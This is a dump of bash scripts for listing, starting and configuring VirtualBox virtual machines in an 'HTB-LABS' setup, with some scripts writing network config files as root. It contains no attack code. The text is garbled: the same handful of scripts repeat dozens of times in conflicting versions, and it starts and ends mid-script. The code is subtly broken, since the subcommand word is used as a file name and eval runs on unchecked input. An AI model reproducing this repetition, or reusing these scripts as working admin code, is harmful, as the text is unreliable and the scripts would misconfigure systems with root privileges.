	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-list-vms.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] list"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_LIST_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_LIST_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_LIST_VMS_SH}" $@
fi


/bin/htb-labs-update-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] update"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to update HTB-LABS configuration files with new information.
update_configs() {

	# Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later.
	read -r -d '' htbs << EOM
$(source "${HTB_LABS_DIR}/htb-labs" 2>/dev/null && env | grep '^HTBS=')
EOM

	# Loop through each HTB-LABS virtual machine provided by user in the above read variable and perform necessary actions.
	for i in $(echo "$htbs" | cut -d' ' -f2-); do
		IFF=$(eval echo \${HTBS_${i}_IFF})
		SUBNET=$(eval echo \${HTBS_${i}_SUBNET})

		# Update the IP address of the specified HTB-LABS virtual machine's virtual network interface configuration file.
		sed -i "s/IPADDR=192\.168\.${SUBNET}.3/IPADDR=192.168.${SUBNET}.4/g" /etc/sysconfig/network-scripts/${IFF}

		# Update the IP address of the specified HTB-LABS virtual machine's virtual network bridge configuration file.
		sed -i "s/IPADDR=192\.168\.${SUBNET}.4/IPADDR=192.168.${SUBNET}.5/g" /etc/sysconfig/network-scripts/${IFF}br

	done

}

##
### Main function to call update_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "update" ]; then
		update_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] create"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_CREATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_CREATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] create"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_CREATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_CREATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-start-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] start <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to start a HTB-LABS virtual machine.
start_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Start the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage startvm "$2" --type headless 2>/dev/null > /tmp/htb-labs-start-vm.log

}

##
### Main function to call start_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "start" ]; then
		start_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-start-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] start <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to start a HTB-LABS virtual machine.
start_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Start the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage startvm "$2" --type headless 2>/dev/null > /tmp/htb-labs-start-vm.log

}

##
### Main function to call start_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "start" ]; then
		start_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] create"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_CREATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_CREATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-start-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] start <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to start a HTB-LABS virtual machine.
start_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Start the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage startvm "$2" --type headless 2>/dev/null > /tmp/htb-labs-start-vm.log

}

##
### Main function to call start_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "start" ]; then
		start_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] create"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_CREATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_CREATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-list-vms.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] list"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_LIST_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_LIST_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_LIST_VMS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-update-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] update"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to update HTB-LABS virtual machine configurations.
update_configs() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

	# Update the IP address of the specified HTB-LABS virtual machine's virtual network interface configuration file.
	sed -i "s/IPADDR=192\.168\.${3}.3/IPADDR=192.168.${3}.4/g" /etc/sysconfig/network-scripts/${1}

	# Update the IP address of the specified HTB-LABS virtual machine's virtual network bridge configuration file.
	sed -i "s/IPADDR=192\.168\.${3}.4/IPADDR=192.168.${3}.5/g" /etc/sysconfig/network-scripts/${1}br

}

##
### Main function to call update_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "update" ]; then
		update_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-list-vms.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] list"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_LIST_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_LIST_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_LIST_VMS_SH}" $@
fi


/bin/htb-labs-start-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] start <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to start a HTB-LABS virtual machine.
start_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Start the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage startvm "$2" --type headless 2>/dev/null > /tmp/htb-labs-start-vm.log

}

##
### Main function to call start_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "start" ]; then
		start_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] create"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_CREATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_CREATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-start-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] start <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to start a HTB-LABS virtual machine.
start_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Start the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage startvm "$2" --type headless 2>/dev/null > /tmp/htb-labs-start-vm.log

}

##
### Main function to call start_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "start" ]; then
		start_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-list-vms.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] list"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_LIST_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_LIST_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_LIST_VMS_SH}" $@
fi


/bin/htb-labs-update-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] update"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to update HTB-LABS virtual machine configurations.
update_configs() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

	# Update the IP address of the specified HTB-LABS virtual machine's virtual network interface configuration file.
	sed -i "s/IPADDR=192\.168\.${3}.3/IPADDR=192.168.${3}.4/g" /etc/sysconfig/network-scripts/${1}

	# Update the IP address of the specified HTB-LABS virtual machine's virtual network bridge configuration file.
	sed -i "s/IPADDR=192\.168\.${3}.4/IPADDR=192.168.${3}.5/g" /etc/sysconfig/network-scripts/${1}br

}

##
### Main function to call update_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "update" ]; then
		update_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-start-vm.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] start <name>"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_START_VM_SH} ]; then
	echo "[!] Error: '${HTB_LABS_START_VM_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_START_VM_SH}" $@
fi


/bin/htb-labs-create-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] create"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to create HTB-LABS virtual machine configurations.
create_configs() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

	# Create the specified HTB-LABS virtual machine's virtual network interface configuration file.
	echo "DEVICE=${1}" > /etc/sysconfig/network-scripts/${1}
	echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/${1}
	echo "ONBOOT=yes" >> /etc/sysconfig/network-scripts/${1}
	echo "IPADDR=192.168.${3}.4" >> /etc/sysconfig/network-scripts/${1}

	# Create the specified HTB-LABS virtual machine's virtual network bridge configuration file.
	echo "DEVICE=${1}br" > /etc/sysconfig/network-scripts/${1}br
	echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/${1}br
	echo "ONBOOT=yes" >> /etc/sysconfig/network-scripts/${1}br
	echo "IPADDR=192.168.${3}.5" >> /etc/sysconfig/network-scripts/${1}br

}

##
### Main function to call create_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "create" ]; then
		create_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-create-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] create"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to create HTB-LABS virtual machine configurations.
create_configs() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

	# Create the specified HTB-LABS virtual machine's virtual network interface configuration file.
	echo "DEVICE=${1}" > /etc/sysconfig/network-scripts/${1}
	echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/${1}
	echo "ONBOOT=yes" >> /etc/sysconfig/network-scripts/${1}
	echo "IPADDR=192.168.${3}.4" >> /etc/sysconfig/network-scripts/${1}

	# Create the specified HTB-LABS virtual machine's virtual network bridge configuration file.
	echo "DEVICE=${1}br" > /etc/sysconfig/network-scripts/${1}br
	echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/${1}br
	echo "ONBOOT=yes" >> /etc/sysconfig/network-scripts/${1}br
	echo "IPADDR=192.168.${3}.5" >> /etc/sysconfig/network-scripts/${1}br

}

##
### Main function to call create_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "create" ]; then
		create_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-list-vms.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] list"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_LIST_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_LIST_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_LIST_VMS_SH}" $@
fi


/bin/htb-labs-create-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] create"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to create HTB-LABS virtual machine configurations.
create_configs() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

	# Create the specified HTB-LABS virtual machine's virtual network interface configuration file.
	echo "DEVICE=${1}" > /etc/sysconfig/network-scripts/${1}
	echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/${1}
	echo "ONBOOT=yes" >> /etc/sysconfig/network-scripts/${1}
	echo "IPADDR=192.168.${3}.4" >> /etc/sysconfig/network-scripts/${1}

	# Create the specified HTB-LABS virtual machine's virtual network bridge configuration file.
	echo "DEVICE=${1}br" > /etc/sysconfig/network-scripts/${1}br
	echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/${1}br
	echo "ONBOOT=yes" >> /etc/sysconfig/network-scripts/${1}br
	echo "IPADDR=192.168.${3}.5" >> /etc/sysconfig/network-scripts/${1}br

}

##
### Main function to call create_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "create" ]; then
		create_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-start-vm.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] start <name>"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_START_VM_SH} ]; then
	echo "[!] Error: '${HTB_LABS_START_VM_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_START_VM_SH}" $@
fi


/bin/htb-labs-create-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] create"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to create HTB-LABS virtual machine configurations.
create_configs() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

	# Create the specified HTB-LABS virtual machine's virtual network interface configuration file.
	echo "DEVICE=${1}" > /etc/sysconfig/network-scripts/${1}
	echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/${1}
	echo "ONBOOT=yes" >> /etc/sysconfig/network-scripts/${1}
	echo "IPADDR=192.168.${3}.4" >> /etc/sysconfig/network-scripts/${1}

	# Create the specified HTB-LABS virtual machine's virtual network bridge configuration file.
	echo "DEVICE=${1}br" > /etc/sysconfig/network-scripts/${1}br
	echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/${1}br
	echo "ONBOOT=yes" >> /etc/sysconfig/network-scripts/${1}br
	echo "IPADDR=192.168.${3}.5" >> /etc/sysconfig/network-scripts/${1}br

}

##
### Main function to call create_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "create" ]; then
		create_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
